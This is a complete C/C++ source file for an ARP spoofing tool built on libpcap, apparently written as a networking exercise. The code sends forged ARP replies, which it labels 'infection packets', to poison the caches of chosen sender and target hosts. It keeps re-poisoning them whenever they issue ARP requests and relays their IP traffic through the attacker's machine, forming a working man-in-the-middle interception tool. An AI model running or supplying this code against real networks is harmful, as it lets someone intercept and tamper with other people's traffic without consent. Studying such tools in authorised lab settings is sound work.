#include <pcap.h>
#include <stdio.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <linux/if_arp.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>

#define MAC_LEN 6
#define IP_LEN 4
#define TIME_INTERVAL 60

#pragma pack(push, 1) 
typedef  struct _type_eth{
    uint8_t dst_mac[MAC_LEN];
    uint8_t src_mac[MAC_LEN];
    uint16_t type;
}type_eth;

typedef struct _type_arp{
    uint16_t hw_type;
    uint16_t proto_type;
    uint8_t hw_len;
    uint8_t proto_len;
    uint16_t op_code;
    uint8_t sndr_mac[MAC_LEN];
    in_addr sndr_ip;
    uint8_t trgt_mac[MAC_LEN];
    in_addr trgt_ip;
}type_arp;

typedef  struct _type_eth_arp{
    type_eth e;
    type_arp a;
} type_eth_arp;
#pragma pack(pop)

typedef struct _type_ip{
    uint8_t h_len:4;
    uint8_t ver:4;
    uint8_t tos;
    uint16_t total_len;
    uint16_t idneti;
    uint8_t off:5;
    uint8_t flag:3;
    uint8_t off_2;
    uint8_t ttl;
    uint8_t proto;
    uint16_t checksum;
    in_addr src_ip;
    in_addr dst_ip;
}type_ip;

bool get_my_mac(char* dev,uint8_t *a_mac){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    strcpy(s.ifr_name, dev);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        for (int i = 0; i < 6; i++)
            a_mac[i]=s.ifr_addr.sa_data[i];
    }
    else
        return false;
    return true;
}

bool get_my_ip(char * dev,in_addr *a_ip) {
    struct ifreq ifrq;
    struct sockaddr_in * sin;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifrq.ifr_name, dev);
    if (0 == ioctl(sockfd, SIOCGIFADDR, &ifrq))  {
        sin = reinterpret_cast<struct sockaddr_in *>(&ifrq.ifr_addr);
        memcpy (a_ip, reinterpret_cast<void *>(&sin->sin_addr), sizeof(sin->sin_addr));
    }
    else
        return false;
    return true;
}

bool is_request(type_arp *recv_arp, type_eth_arp infection_pkt){
    if ((recv_arp->sndr_ip.s_addr == infection_pkt.a.trgt_ip.s_addr) && (recv_arp->trgt_ip.s_addr == infection_pkt.a.sndr_ip.s_addr) && (ntohs(recv_arp->op_code) == ARPOP_REQUEST))
        return true;
    return false;
}

bool is_relay_stot(type_eth *recv_eth, type_ip *recv_ip, type_eth_arp infection_pkt){
    if ((memcmp(recv_eth->src_mac,infection_pkt.e.dst_mac,MAC_LEN) == 0 ) && (recv_ip->src_ip.s_addr == infection_pkt.a.trgt_ip.s_addr))
        return true;
    return false;
}

bool is_relay_ttos(type_eth *recv_eth, type_ip *recv_ip, type_eth_arp infection_pkt){
    if((memcmp(recv_eth->src_mac,infection_pkt.e.dst_mac,MAC_LEN) == 0 ) && (recv_ip->dst_ip.s_addr == infection_pkt.a.sndr_ip.s_addr))
        return true;
    return false;
}

void set_broadcast_packet(type_eth_arp *tmp, uint8_t *sndr_mac,in_addr sndr_ip,in_addr trgt_ip){
    memcpy(tmp->e.src_mac,sndr_mac,MAC_LEN);
    memset(tmp->e.dst_mac,0xff,MAC_LEN);
    tmp->e.type = htons(ETHERTYPE_ARP);
    tmp->a.hw_type = htons(ARPHRD_ETHER);
    tmp->a.proto_type = htons(ETHERTYPE_IP);
    tmp->a.hw_len = MAC_LEN;
    tmp->a.proto_len = IP_LEN;
    tmp->a.op_code = htons(ARPOP_REQUEST);
    memcpy(tmp->a.sndr_mac,sndr_mac,MAC_LEN);
    tmp->a.sndr_ip = sndr_ip;
    memset(tmp->a.trgt_mac,0x00,MAC_LEN);
    tmp->a.trgt_ip = trgt_ip;
}
void set_broadcast_packets(type_eth_arp *tmp, uint8_t *sndr_mac,in_addr sndr_ip,in_addr *trgt_ip, int cnt){
    for (int i=0;i<cnt;i++) {
        set_broadcast_packet(&tmp[i],sndr_mac,sndr_ip,trgt_ip[i]);
    }
}

void time_error(int signo){
    printf("error : No Macs found for corresponding IP\n");
    exit(1);
}

void get_mac(pcap_t * handle, type_eth_arp *tmp){
    struct sigaction act;
    act.sa_handler = time_error;
    sigemptyset(&act.sa_mask);
    act.sa_flags = 0;
    sigaction(SIGALRM, &act, nullptr);
    alarm(TIME_INTERVAL);
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        pcap_sendpacket(handle,reinterpret_cast<const u_char*>(tmp),sizeof (type_eth_arp));
        type_eth_arp *earp = reinterpret_cast<type_eth_arp *>(const_cast<u_char*>(packet));
        if (ntohs(earp->e.type) != ETHERTYPE_ARP )
            continue;
        if ((earp->a.sndr_ip.s_addr == tmp->a.trgt_ip.s_addr) && (earp->a.trgt_ip.s_addr == tmp->a.sndr_ip.s_addr) && (ntohs(earp->a.op_code) == ARPOP_REPLY)){
            memcpy(tmp->e.dst_mac,earp->a.sndr_mac,MAC_LEN);
            memcpy(tmp->a.trgt_mac,earp->a.sndr_mac,MAC_LEN);
            alarm(0);
            break;
        }
    }
}

void get_macs(pcap_t * handle, type_eth_arp *tmp, int cnt){
    for (int i=0;i<cnt;i++) {
        get_mac(handle,&tmp[i]);
    }
}
void set_infection_packet(type_eth_arp *tmp, in_addr fake_ip){
    tmp->a.sndr_ip = fake_ip;
    tmp->a.op_code = htons(ARPOP_REPLY);
}

void set_infection_packets(type_eth_arp *tmp, in_addr *fake_ip, int cnt){
    for (int i=0;i<cnt;i++) {
        set_infection_packet(&tmp[i],fake_ip[i]);
    }
}
void set_relay_packet(type_eth *tmp, uint8_t * src_mac ,uint8_t *dst_mac){
    memcpy(tmp->src_mac,src_mac,MAC_LEN);
    memcpy(tmp->dst_mac,dst_mac,MAC_LEN);
}

void send_infection_packets(pcap_t * handle, type_eth_arp *snd, type_eth_arp *trg, int cnt){
    for (int i=0;i<cnt;i++) {
        for (int j=0;j<3;j++) {
            printf("send infection packet\n");
            pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&snd[i]), sizeof (type_eth_arp));
            pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&trg[i]), sizeof (type_eth_arp));
        }
    }
}

void usage() {
    printf("syntax: arp-spoof <interface> <sender ip> <target ip> <sender ip 2> <target ip 2>...\n");
    printf("sample: arp-spoof wlan0 192.168.0.2 192.168.0.1\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        usage();
        return -1;
    }
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    uint8_t my_mac[MAC_LEN];
    in_addr my_ip;
    int flow_cnt = (argc-2)/2;
    int i=0;
    in_addr *sender_ip = new in_addr[flow_cnt];
    in_addr *target_ip = new in_addr[flow_cnt];
    for (int i=1;i<=flow_cnt;i++) {
        inet_aton(argv[2*i],&sender_ip[i-1]);
        inet_aton(argv[2*i+1],&target_ip[i-1]);
    }

    type_eth_arp *sender_packet = new type_eth_arp[flow_cnt];
    type_eth_arp *target_packet = new type_eth_arp[flow_cnt];

    if (get_my_mac(dev, my_mac) == false){
        printf("error : mac_address can't be imported\n");
        return -1;
    }
    if (get_my_ip(dev, &my_ip) == false){
        printf("error : ip_address can't be imported\n");
        return -1;
    }
    set_broadcast_packets(sender_packet,my_mac,my_ip,sender_ip,flow_cnt);
    set_broadcast_packets(target_packet,my_mac,my_ip,target_ip,flow_cnt);
    get_macs(handle,sender_packet,flow_cnt);
    get_macs(handle,target_packet,flow_cnt);
    set_infection_packets(sender_packet,target_ip,flow_cnt);
    set_infection_packets(target_packet,sender_ip,flow_cnt);
    send_infection_packets(handle, sender_packet, target_packet, flow_cnt);

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        type_eth *eth = reinterpret_cast<type_eth *>(const_cast<u_char *>(packet));
        if(memcmp(eth->dst_mac,my_mac,MAC_LEN) != 0)
            continue;
        if(ntohs(eth->type) == ETHERTYPE_ARP){
            type_arp *arp = reinterpret_cast<type_arp *>(const_cast<u_char *>(packet+sizeof (type_eth)));
            for (i=0;i<flow_cnt;i++) {
                if(is_request(arp,sender_packet[i])){
                    printf("send reply packet to sender\n");
                    pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&sender_packet[i]), sizeof (type_eth_arp));
                    continue;
                }
                if(is_request(arp,target_packet[i])){
                    printf("send reply packet to target\n");
                    pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&target_packet[i]), sizeof (type_eth_arp));
                    continue;
                }
            }
        }
        else if(ntohs(eth->type) == ETHERTYPE_IP){
            type_ip *ip = reinterpret_cast<type_ip *>(const_cast<u_char *>(packet + sizeof (type_eth)));
            for (i=0;i<flow_cnt;i++) {
                if (is_relay_stot(eth,ip,sender_packet[i])){
                    printf("send sender to target relay packet\n");
                    set_relay_packet(eth,sender_packet[i].e.src_mac,target_packet[i].e.dst_mac);
                    pcap_sendpacket(handle,packet,int(header->len));
                    continue;
                }
                if(is_relay_ttos(eth,ip,target_packet[i])){
                    printf("send target to sender relay packet\n");
                    set_relay_packet(eth,target_packet[i].e.src_mac,sender_packet[i].e.dst_mac);
                    pcap_sendpacket(handle,packet,int(header->len));
                    continue;
                }
            }
        }
    }
    delete [] sender_ip;
    delete [] target_ip;
    delete [] sender_packet;
    delete [] target_packet;
    pcap_close(handle);
}
